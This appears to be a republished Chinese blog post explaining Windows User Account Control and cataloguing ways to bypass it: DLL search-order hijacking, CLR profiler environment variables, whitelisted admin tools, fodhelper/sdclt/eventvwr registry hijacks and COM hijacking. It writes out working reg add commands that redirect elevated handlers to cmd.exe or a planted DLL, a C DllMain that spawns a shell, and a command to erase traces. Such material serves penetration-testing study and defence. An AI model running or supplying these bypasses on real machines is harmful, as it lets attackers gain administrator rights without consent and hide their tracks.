> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VEV9NwjGQw1gJ4M6CeElkQ)

**一. UAC**
==========

用户帐户控制（User Account Control，简写作 UAC)是微软公司在其 [Windows Vista](https://baike.baidu.com/item/Windows Vista) 及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。  
管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6Um0wjhbNxIqvhIyuQFISBmtVACX9xqzp7PAo14fuyl7RB5eo0MhDMw/640?wx_fmt=png)

点击 “是”，管理员就会提升到高权限再去运行该任务。

二. autoElevate 与 requestedExecutionLevel
========================================

autoElevate
-----------

当某个 EXE 文件的文件清单里有 <autoElevate> 元素时，当执行该文件时会默认提权执行。  
我们劫持该 exe 文件的 dll，可以达到 Bypass UAC 提权的目的。  
适用范围: 管理员权限以获得，要得到高权限管理员权限

一般用工具 sigcheck 检测

网上常拿 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6OHz4Vic4bYCooP37sNhjm3ZWnoibbSz8Wia98r3oicqaKUic4IJtasCR7zw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6xegHXK1icicliaykmZJF1ocGgIoOUC3rTC52qibSBWibbDMkJz7JGib58nvg/640?wx_fmt=png)

这个东西很有用，是下面部分方法的前提条件

requestedExecutionLevel
-----------------------

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6bR2N3VSThxTuib5mucrPlsjceGtcg5UlUlOo2gyvlvYCqou8tU65vCQ/640?wx_fmt=png)

有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行

asInvoker：父进程是什么权限，此应用程序就是什么权限

requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6NR1oeKrhrEzb1ibx8ebrDhKFKFuxC9brjDhwAb2H4hUOJzUxibOJGpQw/640?wx_fmt=png)

highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出 UAC 框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行

三. 白名单程序
========

除了刚刚说的 autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖 CLR 支持（如事件查看器，任务计划程序）

四. Bypass UAC
=============

1. DLL 劫持
---------

reference:https://www.anquanke.com/post/id/209033  
https://www.cnblogs.com/0daybug/p/11719541.html

exe 文件运行时会加载许多 dll 文件，这些 dll 文件的加载顺序是

*   程序所在目录
    
*   系统目录即`SYSTEM32`目录
    
*   16 位系统目录即`SYSTEM`目录
    
*   `Windows`目录
    
*   程序加载目录 (`SetCurrentDirecctory`)
    
*   `PATH`环境变量中列出的目录
    
    同时，dll 加载也遵循着`Know DLLs注册表项`的机制：Know DLLs 注册表项指定的 DLL 是已经被操作系统加载过后的 DLL，不会被应用程序搜索并加载。在注册表 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS 处可以看见这些 dll
    

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6X9xhWPialyaH4ToFbPnBlZUSpkBqJV1e0bamTmt9xSDJQ0SbWzJ0iang/640?wx_fmt=png)

在 knowdlls 表项中的 dll 是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。

如果我们在应用程序找到正确的 dll 之前，将我们自己创造的 dll 放入优先级更高的搜索目录让应用程序优先加载此 dll 文件，这就造成了 dll 劫持。但这只是 dll 劫持的其中一种途径，他有这些途径：

（1） DLL 替换：用恶意的 DLL 替换掉合法的 DLL  
（2） DLL 搜索顺序劫持：当应用程序加载 DLL 的时候，如果没有带指定 DLL 的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的 DLL。通过将恶意 DLL 放在真实 DLL 之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。  
（3） 虚拟 DLL 劫持：释放一个恶意的 DLL 来代替合法应用程序加载的丢失 / 不存在的 DLL  
（4） DLL 重定向：更改 DLL 搜索的路径，比如通过编辑 %PATH% 环境变量或 .exe.manifest/.exe.local 文件以将搜索路径定位到包含恶意 DLL 的地方。  
（5） WinSxS DLL 替换：将目标 DLL 相关的 WinSxS 文件夹中的恶意 DLL 替换为合法的 DLL。此方法通常也被称为 DLL 侧加载  
（6） 相对路径 DLL 劫持：将合法的应用程序复制（并有选择地重命名）与恶意的 DLL 一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带 LOLbin”，其中合法的应用程序带有恶意的 DLL（而不是从受害者机器上的合法位置复制）。

#### 实践出真知 1

这里我们先用第一种方法来进行实验，实验对象是 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 和 Listary。Listary 是一个很好用的检索小工具，我通过 processmonitor，设置好过滤条件，查看 SystemPropertiesAdvanced.exe 调用的 dll 时发现它会调用一个 Listary 下的一个名为 ListaryHook.dll 的 dll。

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6J9ib66aZqlxdvNQCAtrvaicibxENDrULQkv1efIjY9ODNFfPZCtv6FicAg/640?wx_fmt=png)

由于 listary 目录权限不高，我们可以直接替换该 dll，换成 dllmain 为打开 cmd 的 dll。然后点击运行 SystemPropertiesAdvanced.exe，就会发现会弹出高权限 cmd 窗口

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6tAqy8dSQJMVPUuDX7DpCJV5k3UrxfoKFjpdvnkLI6pSzAtDiaFlJwJw/640?wx_fmt=png)

bypassuac 成功。当然这种都不能算是一个洞，listary 并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。

#### 实践出真知 2

这里使用第三种方法进行实验，实验对象是 eventvwr.msc，它是管理工具中的事件查看器，它依赖于 mmc.exe 来运行。比如，你想运行它，就得通过 mmc eventvwr.msc 来运行它, 并且在 process exploer 中只能看到个 mmc.exe。

我们 process monitor 设置过滤如下

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG69gibSxyjeaRwbC1HWeia3jLkBGFrxACOPCdZvT62rLribzAmY9pk1PDTQ/640?wx_fmt=png)

cmd 运行 mmc eventvwr.msc, 查看调用

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6gOJTXa87GTn6HWuNTNxibtkVK7ApI0BxicXicFJufAjqS5H2iaNrqHFayQ/640?wx_fmt=png)

dll 搜索顺序确实是 程序目录 ->SYSTEM32->SYSTEM->WINDOWS-> 当前目录（这里也是 SYSTEM32 目录，我认为的原因是 mmc 会自动提升权限导致当前目录为 System32 导致的）->PATH 目录。

我们只需在可写目录下植入名为 elsext.dll 的恶意 dll，处理好 dll 的 dllmain 函数，就能让 dllmain 里的指令被高权限执行

但是无奈我这里环境是 win7 sp1, 但是这个洞 7600 才出现，所以复现不了了。但大概思路就是这样的

2. CLR 加载任意 DLL
---------------

CLR 是微软为. net 运行时提供的环境，像 java 的虚拟机一样，而 clr 有一个 Profiling 机制。这个机制简而言之便是可以给 CLR 提供一个 dll，当任何高权限. NET 运行时都会主动加载该 DLL，我们可以构造恶意 dll 给 CLR 加载，从而获得高权限的进程如 cmd，从而 bypassuac。

至于这个 dll 如何给 CLR，是通过修改以下环境变量实现的

<table width="797"><tbody><tr><td><pre class="hljs cpp">作者：ConsT27，转载于https://www.const27.com</pre></td></tr></tbody></table>

CLR 会检查环境变量中的 COR_ENABLE_PROFILING，若为 1 则检查通过，进行下一步。  
在 net4.0 以前，若检查通过，会马上去查找 COR_PROFILER 指定的注册表项，找到其 dll 路径并加载  
net4.0 后，会先查找 COR_PROFILER_PATH 是否指定 dll 文件路径，若没有再去查找 COR_PROFILER 指定的注册表项，找到其 dll 路径并加载。  
总而言之，我们设置好 COR_ENABLE_PROFILING 和 COR_PROFILER 两个项就可以了。

接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10 似乎设置系统环境变量也不需要）。  
以及在注册表，在指定的 CLSID 属性下新建 Inprocserver32 项，并写入恶意 dll 路径. 然后通过 mmc 调用一下 gpedit.msc 这种程序，即可以高权限执行 dll。如果 dll 执行命令为 system(“cmd.exe”) 那么就会蹦出来高权限 cmd 窗口

<table width="797"><tbody><tr><td><pre class="hljs nginx">REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\test\calc.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
mmc gpedit.msc</pre></td></tr></tbody></table>

但我死活复现不起不知道为啥，我的 dll 这样写的

<table width="797"><tbody><tr><td><pre class="hljs cpp">// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include &lt;iostream&gt;
#include &lt;Windows.h&gt;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    char cmd[] = "cmd.exe";

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        WinExec(cmd, SW_SHOWNORMAL);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}</pre></td></tr></tbody></table>

另外的，你还可以为 COR_PROFILER_PATH 设置为如 \\server\share\test.dll 的 smb 的路径，这样也可以实现 bypassuac（没复现）

3. 白名单程序
--------

### odbcad32.exe

这个方法很简单。打开 C:\Windows\system32\odbcad32.exe，然后通过以下方法打开 powershell 或者 cmd

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6GX1kibWjrE9RnWvlhYO4s9HqicOXysd4GZfSpDA7HDDn6qbQfTJ7DZjg/640?wx_fmt=png)

成功 bypass

### ![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6DxPmJOkSiaazP9xEK4VjFcWreuAxibyDg51wwjRbVLvE3Ax2hIS7F7UQ/640?wx_fmt=png)

### 管理工具

之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限 cmd 窗口。这里拿事件查看器举例

操作 -》打开保存的目录 -》文件目录路径处输入 powershell-》弹出高权限 powershell 以此内推，还有很多相似的管理工具可以这样利用

4. 注册表劫持
--------

### Fodhelper.exe

Fodhelper.exe win10 才有，所以只有 win10 能通过这个办法 bypassuac，他是一个 autoelevate 元素程序

我们使用 proceemonitor 查看事件查看器启动的时候执行了什么。我们通过排查发现了此处

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG63W8G6yTpqgy6MX9ATgka27yjJ4rNWtCZUiaQk15XZ4SklgdYxL9toHQ/640?wx_fmt=png)

发现程序试图打开 HKCU\Software\Classes\ms-settings\shell\open\command，但是这个项没有找到，因为这个项并不存在，于是它查询 HKCR\ms-settings\Shell\Open, 查询成功便打开其下的 Command 键进行查询。  
我们可以劫持注册表，往 HKCU\Software\Classes\ms-settings\shell\open\command 写入恶意指令从而达到 bypassuac 的目的。

<table width="797"><tbody><tr><td><pre class="hljs bash">reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d C:\Windows\System32\cmd.exe /f 
reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 00000000 /f</pre></td></tr></tbody></table>

我们写入如下命令，就能让 Fodhelper.exe 执行时自动高权限执行 cmd 窗口了

然后消除痕迹

<table width="797"><tbody><tr><td><pre class="hljs coffeescript">reg delete "HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command"</pre></td></tr></tbody></table>

### sdclt

Win10 后这个程序才有自动提升权限的能力

<table width="797"><tbody><tr><td><pre class="hljs cs">reg add "HKCU\Software\Classes\Folder\shell\open\command" /d C:\Windows\System32\cmd.exe /f 
reg add "HKCU\Software\Classes\Folder\shell\open\command" /v "DelegateExecute" /f</pre></td></tr></tbody></table>

### ![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6ueNUibOMjs2J6KWs5XYDAbu0oAACMvibAE3MEWKsuO7xia54UsvtSicaJQ/640?wx_fmt=png)

### eventvmr

<table width="797"><tbody><tr><td><pre class="hljs cs">reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d C:\Windows\System32\cmd.exe /f</pre></td></tr></tbody></table>

win10，win7 均无效, 不知道是哪个版本的事了，反正记录下来吧。

5. COM 劫持
---------

和 dll 劫持类似，应用程序在运行时也会去加载指定 CLSID 的 COM 组件，其加载顺序如下

<table width="797"><tbody><tr><td><pre class="hljs objectivec">HKCU\Software\Classes\CLSID
HKCR\CLSID
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\</pre></td></tr></tbody></table>

以 eventvwr 为例

执行该程序时会去寻找 {0A29FF9E-7F9C-4437-8B11-F424491E3931} 这个组件，这个组件又需要加载 InProcServer32 指定的 DLL，而这个 DLL 的路径可由用户定义。

而 eventvwr 的这个组件一般在 HKCR\CLSID 找到，所以可以搜索路径劫持。

利用以下方法可以劫持（搜索路径劫持）

<table width="797"><tbody><tr><td><pre class="hljs cs">reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v "" /t REG_SZ /d "d:\msf_x64.dll" /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v "LoadWithoutCOM" /t REG_SZ /d "" /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32 /v "ThreadingModel" /t REG_SZ /d "Apartment" /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v "HideOnDesktop" /t REG_SZ /d "" /f 

reg add HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder /v "Attributes" /t REG_DWORD /d 0xf090013d /f</pre></td></tr></tbody></table>

6. 利用 com 接口
------------

### ICMLuaUtil

### ![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic0uY1a8bXeA9fzrtqVCgDG6P3SZBuo8czrRd9r1eTG6mY6xN8ibs2Aaibiaoib204bqSYIwB01emVDCmw/640?wx_fmt=png)

五. UACME
========

一个开源项目，记录了许多 Bypassuac 的方法。

https://github.com/hfiref0x/UACME/tree/v3.2.x

六. windbg 调试
============

```
作者：ConsT27，转载于https://www.const27.com
```

公众号